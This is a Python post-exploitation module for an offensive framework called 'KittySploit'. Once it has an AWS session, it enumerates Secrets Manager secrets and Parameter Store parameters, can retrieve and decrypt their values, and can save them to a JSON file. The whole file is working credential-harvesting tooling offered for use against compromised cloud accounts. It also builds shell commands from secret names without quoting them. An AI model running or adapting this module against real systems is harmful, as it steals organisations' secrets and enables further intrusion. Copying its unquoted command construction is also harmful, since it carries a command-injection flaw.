#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AWS Secrets Manager Enumeration Module
Author: KittySploit Team
Version: 1.0.0

This module enumerates secrets from AWS Secrets Manager and Parameter Store.
"""

from kittysploit import *
import json
import base64
from core.output_handler import print_info, print_success, print_error, print_warning

class Module(Post):
    """Enumerate secrets from AWS Secrets Manager and Parameter Store"""
    
    __info__ = {
        "name": "Enumerate AWS Secrets",
        "description": "Enumerate secrets from AWS Secrets Manager and Systems Manager Parameter Store",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.AWS,
    }
    
    enum_secrets_manager = OptBool(True, "Enumerate AWS Secrets Manager", False)
    enum_parameter_store = OptBool(True, "Enumerate Systems Manager Parameter Store", False)
    retrieve_values = OptBool(False, "Retrieve secret values (WARNING: may expose sensitive data)", False)
    filter_pattern = OptString("", "Filter secrets by name pattern (e.g., 'prod-*')", False)
    output_file = OptString("", "Output file to save results (JSON format)", False)
    
    def run(self):
        """Run the secrets enumeration"""
        try:
            results = {}
            
            print_info("Starting AWS secrets enumeration...")
            print_info("=" * 80)
            
            # Enumerate Secrets Manager
            if self.enum_secrets_manager.value:
                print_info("\n[1] Enumerating AWS Secrets Manager...")
                secrets = self._enum_secrets_manager()
                if secrets:
                    results['secrets_manager'] = secrets
                    print_success(f"Found {len(secrets)} secrets in Secrets Manager")
                    
                    for secret in secrets:
                        name = secret.get('Name', 'Unknown')
                        arn = secret.get('ARN', 'Unknown')
                        print_info(f"  - {name}")
                        print_info(f"    ARN: {arn}")
                        
                        # Retrieve value if requested
                        if self.retrieve_values.value:
                            print_info(f"    Retrieving value...")
                            value = self._get_secret_value(name)
                            if value:
                                secret['value'] = value
                                # Mask sensitive parts
                                if isinstance(value, dict):
                                    for k, v in value.items():
                                        if isinstance(v, str) and len(v) > 10:
                                            masked = v[:4] + "*" * (len(v) - 8) + v[-4:]
                                            print_info(f"      {k}: {masked}")
                                else:
                                    if isinstance(value, str) and len(value) > 10:
                                        masked = value[:4] + "*" * (len(value) - 8) + value[-4:]
                                        print_info(f"      Value: {masked}")
                    print_warning("⚠️  Secret values retrieved - handle with extreme care!")
                else:
                    print_info("No secrets found in Secrets Manager or access denied")
            
            # Enumerate Parameter Store
            if self.enum_parameter_store.value:
                print_info("\n[2] Enumerating Systems Manager Parameter Store...")
                parameters = self._enum_parameter_store()
                if parameters:
                    results['parameter_store'] = parameters
                    print_success(f"Found {len(parameters)} parameters in Parameter Store")
                    
                    for param in parameters[:20]:  # Show first 20
                        name = param.get('Name', 'Unknown')
                        param_type = param.get('Type', 'Unknown')
                        print_info(f"  - {name} ({param_type})")
                        
                        # Retrieve value if requested
                        if self.retrieve_values.value:
                            value = self._get_parameter_value(name, param_type == 'SecureString')
                            if value:
                                param['value'] = value
                                if isinstance(value, str) and len(value) > 10:
                                    masked = value[:4] + "*" * (len(value) - 8) + value[-4:]
                                    print_info(f"      Value: {masked}")
                    
                    if len(parameters) > 20:
                        print_info(f"  ... and {len(parameters) - 20} more")
                    print_warning("⚠️  Parameter values retrieved - handle with extreme care!")
                else:
                    print_info("No parameters found in Parameter Store or access denied")
            
            # Summary
            print_info("\n" + "=" * 80)
            print_info("ENUMERATION SUMMARY")
            print_info("=" * 80)
            print_success(f"Enumerated:")
            print_info(f"  - Secrets Manager: {len(results.get('secrets_manager', []))}")
            print_info(f"  - Parameter Store: {len(results.get('parameter_store', []))}")
            
            if self.retrieve_values.value:
                print_warning("⚠️  Secret values were retrieved - ensure secure storage!")
            
            # Save to file if requested
            if self.output_file.value:
                try:
                    # Don't save actual values unless explicitly requested
                    save_data = results.copy()
                    if not self.retrieve_values.value:
                        # Remove any accidentally retrieved values
                        for secret in save_data.get('secrets_manager', []):
                            secret.pop('value', None)
                        for param in save_data.get('parameter_store', []):
                            param.pop('value', None)
                    
                    with open(self.output_file.value, 'w') as f:
                        json.dump(save_data, f, indent=2, default=str)
                    print_success(f"Results saved to {self.output_file.value}")
                except Exception as e:
                    print_error(f"Failed to save results: {e}")
            
            return True
            
        except Exception as e:
            print_error(f"Error during enumeration: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _enum_secrets_manager(self):
        """Enumerate Secrets Manager secrets"""
        cmd = "aws secretsmanager list-secrets 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                secrets = data.get('SecretList', [])
                
                # Filter by pattern if specified
                if self.filter_pattern.value:
                    import fnmatch
                    pattern = self.filter_pattern.value
                    secrets = [s for s in secrets if fnmatch.fnmatch(s.get('Name', ''), pattern)]
                
                return secrets
            except:
                pass
        
        # Try Python boto3
        python_cmd = """
python3 -c "
import boto3, json
try:
    sm = boto3.client('secretsmanager')
    response = sm.list_secrets()
    print(json.dumps(response.get('SecretList', [])))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
        result = self.cmd_execute(python_cmd)
        if result and 'ERROR' not in result:
            try:
                secrets = json.loads(result)
                # Filter by pattern if specified
                if self.filter_pattern.value:
                    import fnmatch
                    pattern = self.filter_pattern.value
                    secrets = [s for s in secrets if fnmatch.fnmatch(s.get('Name', ''), pattern)]
                return secrets
            except:
                pass
        return []
    
    def _get_secret_value(self, secret_name):
        """Get secret value"""
        cmd = f"aws secretsmanager get-secret-value --secret-id {secret_name} 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                secret_string = data.get('SecretString')
                if secret_string:
                    # Try to parse as JSON
                    try:
                        return json.loads(secret_string)
                    except:
                        return secret_string
            except:
                pass
        return None
    
    def _enum_parameter_store(self):
        """Enumerate Parameter Store parameters"""
        cmd = "aws ssm describe-parameters 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                parameters = data.get('Parameters', [])
                
                # Filter by pattern if specified
                if self.filter_pattern.value:
                    import fnmatch
                    pattern = self.filter_pattern.value
                    parameters = [p for p in parameters if fnmatch.fnmatch(p.get('Name', ''), pattern)]
                
                return parameters
            except:
                pass
        
        # Try Python boto3
        python_cmd = """
python3 -c "
import boto3, json
try:
    ssm = boto3.client('ssm')
    response = ssm.describe_parameters()
    print(json.dumps(response.get('Parameters', [])))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
        result = self.cmd_execute(python_cmd)
        if result and 'ERROR' not in result:
            try:
                parameters = json.loads(result)
                # Filter by pattern if specified
                if self.filter_pattern.value:
                    import fnmatch
                    pattern = self.filter_pattern.value
                    parameters = [p for p in parameters if fnmatch.fnmatch(p.get('Name', ''), pattern)]
                return parameters
            except:
                pass
        return []
    
    def _get_parameter_value(self, parameter_name, is_secure=False):
        """Get parameter value"""
        cmd = f"aws ssm get-parameter --name {parameter_name}"
        if is_secure:
            cmd += " --with-decryption"
        cmd += " 2>/dev/null"
        
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                param = data.get('Parameter', {})
                return param.get('Value')
            except:
                pass
        return None


